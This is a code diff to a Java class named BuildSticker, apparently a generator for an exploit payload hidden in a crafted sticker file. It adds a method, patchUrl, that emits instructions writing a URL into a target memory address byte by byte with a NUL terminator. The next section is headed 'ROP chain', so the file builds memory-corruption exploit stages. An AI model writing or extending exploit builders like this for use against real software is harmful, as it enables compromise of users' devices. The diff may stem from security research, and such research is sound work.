@@ -535,6 +535,22 @@ public final class BuildSticker {
                 "SET_RP_MEMBER r" + (rNext - 1) + ".<scratch> (s32), r" + z);
     }
 
+    /** Writes a URL string to a memory address, byte by byte, then NUL terminates. */
+    static void patchUrl(long addr, String url) {
+        for (int i = 0; i < url.length(); i++) {
+            int r = alloc();
+            emit(lci(r, url.charAt(i)), "LC.i r" + r + ", '" + url.charAt(i) + "'");
+            loadAddr(addr + i);
+            emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
+                    "SET_RP_MEMBER r" + (rNext - 1) + ".<url byte> (s32), r" + r);
+        }
+        int z = alloc();
+        emit(lci(z, 0), "LC.i r" + z + ", 0  ; NUL terminator");
+        loadAddr(addr + url.length());
+        emit(setRpMember(rNext - 1, FIELD_REF, z, T_S32),
+                "SET_RP_MEMBER r" + (rNext - 1) + ".<url null> (s32), r" + z);
+    }
+
     /* ================================================================== *
      *  6. ROP chain
      * ================================================================== */
